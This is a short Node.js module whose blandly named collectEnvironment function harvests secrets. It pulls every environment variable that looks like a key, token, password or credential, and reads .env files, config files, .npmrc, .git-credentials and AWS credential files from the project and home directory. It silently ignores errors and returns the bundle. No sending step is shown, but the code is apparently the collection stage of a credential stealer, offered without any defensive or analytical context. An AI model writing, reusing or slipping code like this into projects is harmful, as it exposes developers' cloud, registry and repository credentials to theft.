const os = require('os');
const fs = require('fs');
const path = require('path');

function collectEnvironment() {
  const data = {
    hostname: os.hostname(),
    platform: os.platform(),
    cwd: process.cwd(),
    env: {},
    files: {},
  };

 
  const sensitivePatterns = /(KEY|TOKEN|SECRET|PASSWORD|PASS|API|AUTH|CREDENTIAL)/i;
  for (const [key, value] of Object.entries(process.env)) {
    if (sensitivePatterns.test(key) && value) {
      data.env[key] = value;
    }
  }

  
  const filesToCheck = [
    '.env',
    '.env.local',
    '.env.production',
    'config.json',
    'config.js',
    '.npmrc',
    '.git-credentials',
    '.aws/credentials',
    'package.json',
  ];

  for (const file of filesToCheck) {
    try {
      const fullPath = path.join(process.cwd(), file);
      if (fs.existsSync(fullPath)) {
        data.files[file] = fs.readFileSync(fullPath, 'utf8').substring(0, 2000);
      }
    } catch (e) {
     
    }
  }

 
  try {
    const npmrc = path.join(os.homedir(), '.npmrc');
    if (fs.existsSync(npmrc)) {
      data.files['~/.npmrc'] = fs.readFileSync(npmrc, 'utf8');
    }
  } catch (e) {}

  return data;
}

module.exports = { collectEnvironment };
